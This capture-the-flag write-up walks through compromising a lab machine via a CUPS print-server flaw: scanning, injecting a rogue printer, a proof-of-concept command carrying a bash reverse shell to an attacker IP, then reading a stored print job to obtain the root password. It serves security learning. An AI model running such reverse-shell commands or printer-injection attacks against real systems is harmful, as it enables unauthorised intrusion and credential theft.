# Report

We  begin with the usual `nmap` scan.  

```bash
nmap -sV $ip
```

We have some open `ports`.

- 22: `SSH`
- 631: `CUPS`


We get a new service running on port `631` called `CUPS` with a version `2.4`. **CUPS (Common UNIX Printing System)**, a print server that allows a computer to act as a printing host. It supports printing jobs across a network and is commonly found on Linux, macOS, and some UNIX systems. It provides a standardized way to manage print jobs, queues, and drivers over the IPP (Internet Printing Protocol).

We can try to interact with the service using a simple `python script`.  

```python
import cups

# Connect to the remote IPP server
conn = cups.Connection(host="10.10.11.40", port=631)

# List available printers
printers = conn.getPrinters()
for printer in printers:
    print(f"Printer: {printer}, Details: {printers[printer]}")

```

We get an output.

<br/>

Looking for `exploits`, we found a recent  Blog published by `EvilSocket` [here](https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/) Explaining in details the vulnerability. This leads to `RCE`.    

In short, any system running `CUPS`, can be queried a `UDP` packet of the format `0 3 http://<ATTACKER-IP>:<PORT>/printers/whatever`  on port `631`. The server will respond to the `attacker IP` thinking this is a printer. The printer will be setup and can be queried for print jobs. Crafting a malicious `script` to be triggered whenever the malicious printer is asked for a print job leading to `RCE`.    

We can test this by sending this packet to the machine and waiting for a reply.

<br/>

We can see a successful reply. We can now try to `exploit` the vulnerability.   

Using this [POC](https://github.com/IppSec/evil-cups/blob/main/evilcups.py) We can trigger the vulnerability.   

```bash
python3 exp.py 10.10.16.5 10.10.11.40 "bash -c 'sh -i >& /dev/tcp/10.10.16.5/5555 0>&1'"
```

We get an output.  

<br/> 
<img src="/img/EvilCUPS_Screenshots/Pasted image 20241226021841.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the `Web page` on `http://10.10.11.40:631/printers/` We see the new printer added.  

<br/> 
<img src="/img/EvilCUPS_Screenshots/Pasted image 20241226021927.png" alt="1" style="width:700px; height:auto;">
<br/>

We can now manage to `exploit` it by processing a print queue by clicking on `printing a test page`.  

<br/> 
<img src="/img/EvilCUPS_Screenshots/Pasted image 20241226022018.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a connection back.  

<br/> 
<img src="/img/EvilCUPS_Screenshots/Pasted image 20241226022032.png" alt="1" style="width:700px; height:auto;">
<br/>

We are in as `lp` with the home directory `/var/spool/lpd`
This directory is empty but the directory `/var/spool/cups` can be noted. This directory is the place where print jobs are stored. From the documentation we know that the files are in a format `d[5 digit int]-100`  

Trying to list the `directory` we have `no permissions`.  

<br/> 
<img src="/img/EvilCUPS_Screenshots/Pasted image 20241226023425.png" alt="1" style="width:700px; height:auto;">
<br/>

We can try to `bruteforce` for a potential finding.   

<br/> 
<img src="/img/EvilCUPS_Screenshots/Pasted image 20241226023521.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see that the file `d00001-001` is present. We can see a potential `password` present in the file content.   

<br/> 
<img src="/img/EvilCUPS_Screenshots/Pasted image 20241226023600.png" alt="1" style="width:700px; height:auto;">
<br/>

We can try to `su root`.   

<br/> 
<img src="/img/EvilCUPS_Screenshots/Pasted image 20241226023620.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was `pawned` successfully.
